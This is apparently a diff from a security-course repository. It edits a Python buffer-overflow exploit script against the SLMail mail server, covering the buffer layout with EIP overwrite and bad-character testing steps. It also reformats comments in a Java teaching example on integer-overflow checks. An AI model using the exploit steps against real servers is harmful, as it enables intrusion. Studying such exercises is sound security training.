@@ -657,7 +657,7 @@ def determine_bad_characters(ip):
 #          "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
 #          "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
-    buffer='A'*2606 + 'B'*4 + bad_chars + 'C'*(3500-2606-4-255)
+    buffer='A'*2606 + 'B'*4 + badchars + 'C'*(3500-2606-4-255)
     connect_to_SLMail(ip, buffer)
 
 
@@ -762,6 +762,9 @@ if __name__ == "__main__":
 
 #   Send unique string to determine position of input on victim machine:
 #    attack_with_unique_string(ip)
+
+#   Checking if EIP is filled with captial 'B' letters
+#    check_values_attack_input(ip)
 
 #   Determine which characters result in a truncation of the input in the memory of the victim machine
 #    determine_bad_characters(ip)
@@ -1811,9 +1814,6 @@ import java.math.BigInteger;
 import java.util.ArrayList;
 import java.util.List;
 
-/**
- * Hello world!
- */
 public class IntegerOverflow {
 	private static final int MAX = 100;
 
@@ -1822,10 +1822,8 @@ public class IntegerOverflow {
 
 	public IntegerOverflow() {
 		current = 0;
-		// Reserviert speicher bis 100
-		data = new ArrayList<String>(MAX);
-		// Fill Array
-		for (int i = 0; i < MAX; i++) {
+		data = new ArrayList<String>(MAX);  // Reserviert speicher bis 100
+		for (int i = 0; i < MAX; i++) {  // Fill Array
 			data.add(i, "");
 		}
 	}
@@ -1858,9 +1856,7 @@ public class IntegerOverflow {
 		System.out.println(io.data.toString());
 	}
 
-	/**
-	 * 1. Problem when add value to current we could overflow (get negative value)
-	 */
+  // 1. Problem when add value to current we could overflow (get negative value)
 	private void setElementToExtraPosition(int extra, String element) {
 		if (extra < 0 || current + extra > MAX)
 			throw new IllegalArgumentException();
@@ -1868,9 +1864,7 @@ public class IntegerOverflow {
 		data.set(current + extra, element);
 	}
 
-	/**
-	 * Solve Problem 1, but still can go wrong
-	 */
+  // Solve Problem 1, but still can go wrong
 	private void setElementToExtraPositionMoreSecure(int extra, String element) {
 		if (extra < 0 || current > MAX - extra)
 			throw new IllegalArgumentException();
@@ -1878,9 +1872,7 @@ public class IntegerOverflow {
 		data.set(current + extra, element);
 	}
 
-	/**
-	 * Securest Version but has issues with performance
-	 */
+  // Securest Version but has issues with performance
 	private void setElementToExtraPositionSecure(int extra, String element) {
 		BigInteger currentBig = BigInteger.valueOf(current);
 		BigInteger maxBig = BigInteger.valueOf(MAX);
